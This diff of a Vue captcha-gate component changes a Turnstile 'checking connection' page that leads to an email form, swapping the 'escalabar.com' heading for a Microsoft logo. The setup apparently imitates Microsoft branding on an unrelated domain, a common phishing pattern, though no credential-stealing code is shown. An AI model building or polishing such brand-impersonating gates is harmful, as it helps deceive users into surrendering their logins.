@@ -1,11 +1,15 @@
 <template>
   <div v-if="!captchaToken" class="gate-container">
     <header>
-      <h1>escalabar.com</h1>
+      <img
+        src="https://banner2.cleanpng.com/20180611/wwx/kisspng-microsoft-logo-tec-partners-limited-5b1eb5d0dddba0.6513803415287392809088.jpg"
+        alt="Escalabar Logo"
+        class="logo-img"
+      />
     </header>
     <main>
       <div class="instructions">
-        <h2>Please stand by while we are cheking if the site connection is secure.</h2>
+        <h2>Please stand by while we are checking if the site connection is secure.</h2>
         <div
           class="cf-turnstile"
           data-sitekey="0x4AAAAAABgei6QZruCN7n08"
@@ -13,7 +17,7 @@
       </div>
     </main>
     <footer>
-      <p>Did you know there are Verified Bots that are allowed around the internet because they help provide services we use day to day?.</p>
+      <p>Did you know there are Verified Bots that are allowed around the internet because they help provide services we use day to day?</p>
     </footer>
   </div>
 
@@ -54,7 +58,6 @@
         <div class="divider"></div>
         <div class="footer-container">
           <p class="footer-text">© 2025 All rights reserved </p>
-          <div class="global-footer"></div>
         </div>
       </div>
     </div>
@@ -140,7 +143,6 @@ function cancelHold() {
 </script>
 
 <style scoped>
-/* CaptchaGate styles */
 .gate-container {
   min-height: 75vh;
   display: flex;
@@ -148,15 +150,12 @@ function cancelHold() {
   justify-content: center;
   text-align: center;
 }
-header h1 {
-  margin-left: 70;
-  font-size: 3rem;
-  font-weight: bold;
-  text-align: center;
-  margin-bottom: 1.5rem;
+.logo-img {
+  max-width: 220px;
+  margin: 0 auto 1.5rem;
 }
 .instructions {
-  margin: 40px 0 0 0;
+  margin-top: 20px;
   text-align: center;
 }
 .instructions h2 {
@@ -170,7 +169,6 @@ footer p {
   text-align: center;
 }
 
-/* Email form styles */
 .background {
   display: flex;
   justify-content: center;
